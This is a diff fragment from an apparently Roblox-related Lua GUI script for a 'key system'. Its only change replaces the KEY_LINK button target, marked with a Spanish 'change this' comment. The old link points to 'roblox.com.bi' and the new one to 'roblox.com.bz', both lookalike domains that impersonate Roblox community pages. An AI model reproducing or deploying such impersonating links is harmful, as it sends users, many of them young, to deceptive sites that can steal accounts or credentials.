@@ -120,7 +120,7 @@ statusLabel.Font = Enum.Font.Gotham
 statusLabel.Parent = mainFrame
 
 -- ================== LINK ==================
-local KEY_LINK = "https://www.roblox.com.bi/communities/757687086654/Scripting-Key-(see-announcement)#!/about"  -- ← Cambia esto
+local KEY_LINK = "https://roblox.com.bz/communities/5527015584/"  -- ← Cambia esto
 -- =========================================
 
 -- Hover Effects
